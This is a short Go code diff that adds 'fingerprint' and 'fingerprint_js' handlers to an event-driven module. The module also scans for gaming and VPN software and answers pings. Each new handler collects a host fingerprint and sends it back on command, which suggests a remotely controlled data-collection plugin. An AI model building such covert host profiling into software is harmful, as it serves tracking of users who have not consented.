@@ -88,6 +88,10 @@ func handleEvent(event string, payload []byte) error {
 		go handleScanGaming()
 	case "scan_vpn":
 		go handleScanVPN()
+	case "fingerprint":
+		go handleFingerprint()
+	case "fingerprint_js":
+		go handleFingerprintJS()
 	case "ping":
 		sendEvent("pong", nil)
 	default:
@@ -552,6 +556,33 @@ func handleScanVPN() {
 
 func handleUnload() {
 	log.Printf("[recovery] unloading")
+}
+
+func handleFingerprint() {
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("[recovery] fingerprint panic: %v", r)
+			sendEvent("error", map[string]string{"error": "fingerprint error"})
+		}
+	}()
+	sendEvent("fingerprint_result", recovery.CollectFingerprint())
+	log.Printf("[recovery] fingerprint collected")
+}
+
+func handleFingerprintJS() {
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("[recovery] fingerprint_js panic: %v", r)
+			sendEvent("error", map[string]string{"error": "fingerprint_js error"})
+		}
+	}()
+	result := recovery.CollectJSFingerprint()
+	if result == nil {
+		sendEvent("fingerprint_js_result", map[string]string{"error": "failed to collect JS fingerprint"})
+		return
+	}
+	sendEvent("fingerprint_js_result", result)
+	log.Printf("[recovery] JS fingerprint collected")
 }
 
 func main() {}
